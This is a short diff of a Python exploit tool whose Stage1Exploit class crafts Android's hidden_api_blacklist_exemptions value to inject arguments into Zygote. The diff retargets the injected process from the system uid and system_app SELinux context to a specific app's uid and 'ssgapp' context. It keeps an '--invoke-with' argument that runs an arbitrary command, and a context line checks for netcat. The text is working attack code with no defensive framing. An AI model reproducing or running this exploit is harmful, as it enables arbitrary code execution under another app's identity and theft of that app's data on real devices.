@@ -179,8 +179,6 @@ class Stage1Exploit:
         else:
             raise ZygoteInjectionException("netcat binary was not found")
 
-   
-
     @staticmethod
     def generate_stage1_exploit(command: str, exploit_type: str) -> str:
         "generates the hidden_api_blacklist_exemptions value to trigger the exploit"
@@ -189,15 +187,13 @@ class Stage1Exploit:
         assert "," not in command
         # TODO let you specify the SELinux context through command line arguments
         raw_zygote_arguments = [
-            "--setuid=1000",
-            "--setgid=0",
+            "--setuid=10079",
+            "--setgid=10079",
             "--setgroups=3003",
-            "--target-sdk-version=28",
-            "--nice-name=system_server",
-            "--app-data-dir=/data/user/0/com.android.settings",
             "--runtime-args",
-            "--seinfo=platform:system_app:complete",
+            "--seinfo=ssgapp:ssg_app:targetSdkVersion=28:complete",
             "--runtime-flags=1",
+            "--nice-name=ssgapp",
             "--invoke-with",
             f"{command}#",
         ]
